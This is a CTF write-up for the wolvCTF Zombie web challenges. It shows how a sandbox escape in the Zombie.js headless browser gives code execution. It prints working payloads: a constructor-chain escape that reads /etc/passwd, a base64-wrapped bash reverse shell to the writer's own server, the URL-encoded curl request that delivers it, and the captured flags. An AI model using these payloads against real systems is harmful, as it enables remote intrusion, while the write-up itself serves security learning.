---
title: wolvCTF Zombie 201
type: page
description: writeups of wolvCTF.
topic: ctf
Author: bluesam
date: 2023-03-20
---
# Zombie 101 - Web

As debug off and httponly on its gonna be hard. maybe?

##IDEA

Zombie last version is from 2018, maybe we will find some 0-day (1-day ofc if its the intended way) https://github.com/assaf/zombie/blob/master/CHANGELOG.md

our version on the challenge is the last one, confirmed on package.json:

```javascript
{
  "name": "zombie",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "author": "",
  "dependencies": {
    "escape-html": "^1.0.3",
    "express": "^4.18.2",
    "zombie": "^6.1.4"
  }
}
```
# Start of our research

On the zombie.js npm page we can find this comment : WARNING: Crawling untrusted web pages with Zombie.js is not safe.

Given this warning we instantly jump into the github page of zombie and try to search into issues tab for security issues report.

In an issue we can find a comment wrotten by the creator of the project :
```
Zombie is “full-stack testing using Node.js”. 
It’s fit for purpose: use it in your test environment, to run test suites, against your application code.
Zombie is not designed to test adversaries (eg pen tests, web scraping).
```
In this issue we can find a rejected CVE : https://github.com/nodejs/security-wg/pull/442 So we look what people already found on it.

At this moment we found an interesting comment with a POC of a way to execute arbritrary code.
```js
const vm = require('vm');
const result = vm.runInNewContext(`
  (function() {
    var c = 'constructor';
    var require = require=this[c][c]('return process')().mainModule.require;
    var fs = require('fs');
    return String(fs.readFileSync('/home/joshbreckman/Documents/vm.js'));
  })()
`);
```
console.log(result);

Basicaly this guy tested within the VM module for testing purpose, but from what is said zombie suffer the same issue.

So lets try this localy with the bot.js file used on the challenge and tweak it to our needs.
bot.js
```javascript
const zombie = require("zombie")

const browser = new zombie ({
    waitDuration: 5*1000,
    localAddress: 0 // without this, calls to localhost fail!
})

const httpOnly = 'true'
const hostname = "localhost"
const url = "http://localhost:8000/exploit.html"

process.env.FLAG = "Fake{Flag}"

browser.setCookie({ name: 'flag', domain: hostname, path:'/', value: process.env.FLAG, httpOnly: httpOnly})

browser.visit(url, function() {})  
```
# exploit.html
```html
<script>
    aa = (function() {
        var c = 'constructor';
        var require = require=this[c][c]('return process')().mainModule.require;
        var fs = require('fs');
        return String(fs.readFileSync('/etc/passwd'));
    })();
    console.log(aa);
</script>
```
When the script fired we obtain our /etc/passwd file:

So we have the confirmation that an RCE is possible with Zombie.js 6.1.4.

Now lets try to catch a reverse shell and flag the challenge.

Our initial reverse shell :

`sh -i >& /dev/tcp/ourserverip/4444 0>&1`

Base64 encode it:

`echo -n 'sh -i >& /dev/tcp/ourserverip/4444 0>&1' | base64 -w 0
c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx`

and now lets update our exploit.html file.
```HTML
<script>
    (function() {
        var c = 'constructor';
        var require = require=this[c][c]('return process')().mainModule.require;

        require('child_process').exec('echo c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx | base64 -d | bash')
    })();
</script>
```
We try again in local with our bot.js file and booom we received a shell!

From now we can minify and url encode our payload in exploit.html and make the bot of the challenge visit it.

Set a listener on listener:

`nc -lvp 4444`

and now fire the payload to the bot
```curl
curl 'http://zombie-301-tlejfksioa-ul.a.run.app/visit?url=https://zombie-301-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3E%28function%28%29%7Bvar%20c%3D%27constructor%27%3Bvar%20require%3Drequire%3Dthis%5Bc%5D%5Bc%5D%28%27return%20process%27%29%28%29.mainModule.require%3Brequire%28%27child_process%27%29.exec%28%27echo%20c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx%20%7C%20base64%20-d%20%7C%20bash%27%29%7D%29%28%29%3B%3C%2Fscript%3E'
```
and GGs !
```linux
Ncat: Connection from 35.203.246.158:40367.
sh: 0: can't access tty; job control turned off

$ id
uid=1000(node) gid=1000(node) groups=1000(node)

$ pwd
/ctf/app

$ ls
bot.js
config.json
index.js
node_modules
package-lock.json
package.json
public

$ cat config.json
{"flag": "wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831}", "httpOnly": true, "allowDebug": false}

As the browser were vulnerable for all 4 Zombie challenges we can retrieve our two missing flag for Zombie 301 and zombie 401, just repeat same steps for http://zombie-401-tlejfksioa-ul.a.run.app/

Zombie 301 : wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831} Zombie 401 : wctf{y0u-4r3-4n-4dm1n-807-m4573r-86835}
```
A big thanks to SamXML for proposing this list of challenge ;)
Ressources

https://www.npmjs.com/package/zombie https://github.com/assaf/zombie https://github.com/nodejs/security-wg/pull/442#issuecomment-442200323 https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af
